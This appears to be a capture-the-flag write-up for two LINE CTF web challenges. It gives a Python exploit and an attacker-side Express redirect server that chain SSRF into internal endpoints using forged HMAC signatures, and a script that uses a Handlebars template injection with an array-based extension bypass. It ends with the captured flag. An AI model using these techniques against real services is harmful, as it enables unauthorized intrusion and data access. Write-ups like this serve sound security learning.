
# diveinternal

* Default redirect support with Node.js `request` and python `requests`
* The main goal is to create a file under `/backup` , then visit `/rollback` with flag back in header. A slight race is needed.
* run server.js on vps to give handful support

exp.py
```python
import requests
import hmac
import hashlib
import json

privateKey = b'let\'sbitcorinparty'


def sign(query_string):
    return hmac.new(privateKey, query_string, hashlib.sha512).hexdigest()


url = 'http://34.85.51.108/'



VPS_IP = '120.27.246.202'


def create():
    query = 'src=http://VPS_IP/byc404'
    r = requests.get(url + 'apis/coin', headers={
        'Host': VPS_IP,
        'Lang': '#',
        'Sign': sign(query.encode())
    })
    print(r.headers['lang'])


def getStatus():
    r = requests.get(url + 'apis/coin', headers={
        'Host': VPS_IP,
        'Lang': 'status',
    })
    dbHash = json.loads(r.headers['lang'])['dbhash']
    integrityKey = hashlib.sha512((dbHash).encode('ascii')).hexdigest()
    print('Key: ' + integrityKey)
    return integrityKey


def getFlag(integrityKey):
    query = 'dbhash=byc404'
    r = requests.get(url + 'apis/coin', headers={
        'Host': VPS_IP,
        'Lang': 'flag',
        'Key': integrityKey,
        'Sign': sign(query.encode())
    })
    print(r.headers['lang'])


if __name__ == '__main__':
    while True:
        create()
        getFlag(getStatus())

```

server.js
```javascript
const express = require('express');
const logger = require('morgan');

const app = express();
app.use(logger('dev'))

app.get('/', (req, res) => {
        res.redirect('http://127.0.0.1:5000/download?src=http://120.27.246.202/byc404')
})

app.get('/status', (req, res) => {
        res.redirect('http://127.0.0.1:5000/integrityStatus')
})
app.get('/flag', (req, res) => {
        res.redirect('http://127.0.0.1:5000/rollback?dbhash=byc404');
})

app.get('/byc404', (req, res) => {
        res.sendFile('/proc/self/cwd/byc404');
})

app.listen(80)
```

## babysandbox

* use array to bypass ext limit. This chall has `hbs` installed so same way as I did in HUAWEI CTF (handlebars tricks) 

```python
import requests

res = ''
for i in range(60):
    res+='{{%s}}' % str(i)

PAYLOAD = """{{#each this}}
%s
{{/each}}
"""  % res
url = 'http://35.221.86.202/04e69cc28fc76d7a5c0c2674483d0c81feaed0aa485454beba75a89c22e621fd'

NAME = 'bycexp404'

r = requests.post(url , json = {
    'filename': NAME,
    "contents": PAYLOAD,
    'ext': [".ejs","a","b",".hbs"]
})

print(r.text)

r = requests.get(url + '/' + NAME + '.ejs,a,b,.hbs')
print(r.text)
```
FLAG : `LINECTF{I_think_emilia_is_reallllly_t3nshi}`  (EMT!EMT!EMT!)

